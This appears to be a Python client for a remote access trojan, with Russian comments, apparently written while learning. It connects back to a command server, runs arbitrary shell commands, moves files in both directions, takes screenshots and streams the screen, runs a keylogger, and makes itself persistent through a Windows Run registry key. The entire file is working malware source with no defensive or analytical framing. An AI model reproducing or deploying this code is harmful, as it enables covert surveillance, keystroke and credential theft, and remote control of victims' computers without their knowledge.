import socket
import json
import subprocess
import os

import threading
import keylogger

# persist
import sys
import shutil

# connection
import time

# Системная инфомрмация
import platform

# Вроде, не нужна:
#import cv2
import numpy as np
import pickle
import struct
import pyautogui
from PIL import Image


# Отправить ответ
def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode()) # В python3 - нужен encode

"""
# Если значение принимаемых данных выйдет за пределы 1024
# То программа сломается
    s.recv(1024)

#  Следующая функция обходит это 
"""
def reliable_recv():
    data = ''
    while True:
        try:
            # Нужно декодировать в python3 (иначе будет ошибка)
            # rstrip() - чтобы не было переноса на новую строку
            #
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def upload_file(file_name):
    # Файл бинарный, поэтому нужно исп rb
    f = open(file_name, 'rb')
    s.send(f.read())
    #f.close()

def download_file(file_name):
    # Файл бинарный, поэтому нужно исп wb
    f = open('download/' + file_name, 'wb')
    # Чтобы обнаржуить окончание загрузки файла
    # выставляем таймаут
    # Если файл закочится, цикл завершится
    s.settimeout(1)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    # Выставялем timeout=None, чтобы не было пролем с другими функциями
    s.settimeout(None)
    f.close()

def screenshot():
    myscreenshot = pyautogui.screenshot()
    myscreenshot.save('screen.png')

# Вызов: persistence Hacked program.exe
def persist(reg_name, copy_name):
    # Сохранить в папку User/AppData/Romaning (Windows)
    file_location = os.environ['appdata'] + "\\" + copy_name
    # file_location = copy_name
    try:
        if not os.path.exists(file_location):
            # Добавляем в автозагруку (через регистры)
            shutil.copyfile(sys.executable, file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + reg_name + ' /t REG_SZ /d "' + file_location + '"', shell=True)
            reliable_send('[+] Created Persistence With Reg Key: ' + reg_name)
        else:
            reliable_send('[+] Persistence Already Exists')
    except:
        reliable_send('[-] Error Creating Persistence With The Target Machine')

# Не уверен восстанавливается ли подключение, если оно пропало
QUIT = True
DISCONNECT = False
def connection():
    global s
    ip = '127.0.0.1'
    port = 5555
    while True:
        time.sleep(5)
        try:
            # Адрес сервера к котрому подключаемся
            s.connect((ip, port))
            result = shell()
            # Если сервер отпраил команду Выход,
            # То выходим из цикла, 
            # завершая этим работу приложения
            if result == QUIT:
                # Выход из 1 го While (shell)
                s.close()
                # Выход из текущего While (connection)
                break
            # Если сервер отправил команду Disconnect,
            # То мы разрывам с ним соединение (удлаив сокет)
            # При этом сразу же создаем новый, чтобы 
            # восстановить поытки соединения после разъединения
            elif result == DISCONNECT:
                s.close()
                time.sleep(20)
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        except:
            # Если много будет спать,
            # то, возможно, будет много рекурсивых вызовов
            connection()

# Проблема:
# Как выйти из цикла?
def show_stream():
    global s
    while True:
        image = pyautogui.screenshot()
        image = image.resize((1280, 720), Image.ANTIALIAS)
        image = np.array(image)
        img = Image.frombytes('RGB', (1280, 720), image)
        data = pickle.dumps(np.array(img))
        s.sendall(struct.pack("L", len(data)) + data)

def shell():
    while True:
        command = reliable_recv()
        # Закрываем программу, если пришла команда quit
        if command == 'quit':
            return True
        elif command == 'disconnect':
            return False
        # При получении следующей команды, мы не закроем программу на этой машине
        # Но это нам позволит перейти в Command Center на галвной машине
        elif command == 'help':
            pass
        elif command == 'clear':
            pass
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
            reliable_send(",".join(os.listdir()))
        elif command[:2] == 'ls':
            reliable_send(",".join(os.listdir()))
        elif command[:7] == 'upload ':
            download_file(command[7:])
        elif command[:9] == 'download ':
            upload_file(command[9:])
        elif command[:10] == 'screenshot':
            screenshot()
            upload_file('screen.png')
            os.remove('screen.png')
        elif command[:13] == 'screen_stream':
            show_stream()
        elif command[:12] == 'keylog_start':
            keylog = keylogger.KeyLogger()
            t = threading.Thread(target=keylog.start)
            t.start()
            reliable_send('[+] Keylogger Started!')
        elif command[:11] == 'keylog_dump':
            logs = keylog.read_logs()
            reliable_send(logs)
        elif command[:11] == 'keylog_stop':
            keylog.self_destruct()
            t.join()
            reliable_send('[+] Keylogger Stopped!')
        # Вызов: persistence Hacked program.exe
        elif command[:15] == 'get_system_info':
            reliable_send(",".join(platform.uname()))
        elif command[:11] == 'persistence':
            reg_name, copy_name = command[12:].split(' ')
            persist(reg_name, copy_name)
        else:
            execute = subprocess.Popen(command,
                                       shell=True,
                                       stdout=subprocess.PIPE,
                                       stderr=subprocess.PIPE,
                                       stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_recv()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()